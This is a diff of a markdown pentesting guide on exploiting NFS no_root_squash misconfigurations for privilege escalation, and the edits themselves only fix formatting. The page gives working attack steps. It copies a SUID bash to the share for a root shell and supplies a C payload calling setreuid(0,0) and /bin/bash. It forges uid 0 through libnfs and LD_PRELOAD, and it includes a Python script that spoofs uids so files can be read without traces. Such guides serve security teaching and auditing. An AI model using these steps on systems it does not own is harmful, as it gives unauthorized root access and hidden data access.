@@ -1,7 +1,5 @@
 # NFS No Root Squash Misconfiguration Privilege Escalation
 
-
-
 ## Squashing Basic Info
 
 NFS will usually (specially in linux) trust the indicated `uid` and `gid` by the client conencting to access the files (if kerberos is not used). However, there are some configurations that can be set in the server to **change this behavior**:
@@ -37,9 +35,9 @@ chmod +s bash
 cd <SHAREDD_FOLDER>
 ./bash -p #ROOT shell
 ```
-```
+
 Option 2 using c compiled code:
-- **Mounting that directory** in a client machine, and **as root copying** inside the mounted folder our come compiled payload that will abuse the SUID permission, give to it **SUID** rights, and **execute from the victim** machine that binary (you can find here some[[payloads-to-execute.md#c)| C SUID payloads]].
+- **Mounting that directory** in a client machine, and **as root copying** inside the mounted folder our come compiled payload that will abuse the SUID permission, give to it **SUID** rights, and **execute from the victim** machine that binary (you can find here some[ C SUID payloads](payloads-to-execute.md#c)).
     - Same restrictions as before
 
 ```bash
@@ -55,7 +53,7 @@ chmod +s payload
 cd <SHAREDD_FOLDER>
 ./payload #ROOT shell
 ```
-```
+
 ### Local Exploit
 
 > [!TIP]
@@ -66,7 +64,7 @@ cd <SHAREDD_FOLDER>
 
 ### Basic Information
 
-The scenario involves exploiting a mounted NFS share on a local machine, leveraging a flaw in the NFSv3 specification which allows the client to specify its uid/gid, potentially enabling unauthorized access. The exploitation involves using [[https://github.com/sahlberg/libnfs|libnfs]], a library that allows for the forging of NFS RPC calls.
+The scenario involves exploiting a mounted NFS share on a local machine, leveraging a flaw in the NFSv3 specification which allows the client to specify its uid/gid, potentially enabling unauthorized access. The exploitation involves using [libnfs](https://github.com/sahlberg/libnfs), a library that allows for the forging of NFS RPC calls.
 
 #### Compiling the Library
 
@@ -78,7 +76,7 @@ The library compilation steps might require adjustments based on the kernel vers
 make
 gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
 ```
-```
+
 #### Conducting the Exploit
 
 The exploit involves creating a simple C program (`pwn.c`) that elevates privileges to root and then executing a shell. The program is compiled, and the resulting binary (`a.out`) is placed on the share with suid root, using `ld_nfs.so` to fake the uid in the RPC calls:
@@ -90,7 +88,7 @@ cat pwn.c
 int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
 gcc pwn.c -o a.out
 ```
-```
+
 2. **Place the exploit on the share and modify its permissions by faking the uid:**
 
 ```bash
@@ -99,14 +97,14 @@ LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
 ```
-```
+
 3. **Execute the exploit to gain root privileges:**
 
 ```bash
 /mnt/share/a.out
 #root
 ```
-```
+
 ### Bonus: NFShell for Stealthy File Access
 
 Once root access is obtained, to interact with the NFS share without changing ownership (to avoid leaving traces), a Python script (nfsh.py) is used. This script adjusts the uid to match that of the file being accessed, allowing for interaction with files on the share without permission issues:
@@ -129,13 +127,11 @@ uid = get_file_uid(filepath)
 os.setreuid(uid, uid)
 os.system(' '.join(sys.argv[1:]))
 ```
-```
+
 Run like:
 
 ```bash
 # ll ./mount/
 drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
 ```
-```
-
 
